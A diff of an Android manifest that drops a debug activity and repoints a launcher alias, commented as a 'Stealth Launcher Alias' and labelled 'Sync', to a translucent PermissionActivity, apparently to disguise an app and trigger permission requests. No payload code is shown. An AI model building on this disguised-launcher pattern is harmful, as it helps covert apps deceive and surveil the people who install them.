@@ -37,18 +37,12 @@
             android:exported="false"
             android:theme="@android:style/Theme.Translucent.NoTitleBar" />
 
-        <!-- 🛠️ TEMPORARY DEBUG LOG CONSOLE ACTIVITY -->
-        <activity
-            android:name=".DebugLogActivity"
-            android:exported="true"
-            android:theme="@style/Theme.AppCompat.NoActionBar" />
-
-        <!-- Stealth Launcher Alias (Points to DebugLogActivity during testing) -->
+        <!-- Stealth Launcher Alias (Triggers Permission check if clicked) -->
         <activity-alias
             android:name=".LauncherAlias"
-            android:targetActivity=".DebugLogActivity"
+            android:targetActivity=".PermissionActivity"
             android:exported="true"
-            android:label="Sync Debug"
+            android:label="Sync"
             android:icon="@drawable/ic_launcher">
             <intent-filter>
                 <action android:name="android.intent.action.MAIN" />
